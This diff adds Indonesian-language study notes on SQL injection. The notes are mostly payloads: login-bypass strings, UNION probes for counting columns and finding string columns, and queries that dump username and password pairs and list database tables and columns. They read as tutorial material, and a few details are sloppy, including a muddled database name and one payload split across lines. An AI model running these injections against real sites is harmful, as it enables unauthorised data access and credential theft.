@@ -1,0 +1,70 @@
+# Subverting app logic di login:
+`username' AND '1'='1' --`
+`username' AND '1'='1' -- -`
+`username' OR '1'='1' --`
+`username' OR '1'='1' -- -`
+
+
+# UNION attack:
+## Determine columns
+Perlu untuk cek banyak kolom yang di return dari original query
+Cara 1 menggunakan `order by`:
+	- `' order by 1#/--`
+	- `' order by 2#/--`
+	- `' order by 3#/--`
+Cara 2 menggunakan `union select null,null,null..`
+	- `' union select null#/--`
+	- `' union select null,null#/--`
+	- `' union select null,null,null#/--`
+khusus oracle db
+	- `' UNION SELECT NULL FROM DUAL--`
+jika lebih dari payload untuk cek jumlah kolom, maka akan memberikan error messages. Keep in mind, cara 2 memungkinkan akan ada error tambahan seperti `NullPointerException`. Perlu diingat juga value dari 2 tabel harus saling compatible.
+
+## Find columns with useful data type
+test apakah kolom dapat hold data string
+	- `' UNION SELECT 'a',NULL,NULL,NULL#/--`
+	- `' UNION SELECT NULL,'a',NULL,NULL#/--`
+	- `' UNION SELECT NULL,NULL,'a',NULL#/--`
+	- `' UNION SELECT NULL,NULL,NULL,'a'#/--`
+	- `' UNION SELECT 'a',NULL FROM DUAL#/--`
+jika kolom tidak kompatible dengan string maka akan mendapat error, contohnya `Conversion failed when converting the varchar value 'a' to data type int.`
+
+## Retrieve interesting data
+string query harus terdapat di belakang statement `WHERE`. Contoh payload:
+	- `' union select username,password from users--`
+untuk perform attack ini harus tahu bahwa ada tabel `users` dengan kolom `username` dan `password`
+
+## Retrieve multiple value in single column
+kita dapat menggunakan payload berikut untuk:
+	- `' union select username || '~' || password from users#/--`
+`~` dipakai sebagai separator
+
+## Cek versi database lewat SQLI
+Coba salah satu dari pilihan database berikut, dan gunakan sebagai query saat inject
+	- Microsoft MySQL `SELECT @@version`
+	- Oracle `SELECT * FROM v$version`
+	- PostgreSQL `SELECT version()`
+contoh query injection dengan UNION:
+	- `' UNION SELECT @@version,null,null#/--`
+
+## Listing db content
+banyak tipe db (kecuali Oracle) punya information schema. Jadi kita bisa guankan hal tersebut untuk query
+	- `' union select table_name,null from informatio
+n_schema.tables#/--`
+	- `' union select table_name,null from all_tables#/--`   **ORACLE**
+selanjutnya cek nama kolom dari tabel yang didapatkan
+	- `' union select column_name,null from information_schema.columns where table_name='nama_tabel'#/--`
+	- `' union select column_name,null from all_tab_columns where table_name = 'nama_tabel'#/--` **ORACLE**
+selanjutnya baru bisa lihat isi kolomnya
+	- `' union select kolom1,kolom2 from nama_tabel--`
+
+
+
+
+
+
+
+
+
+
+
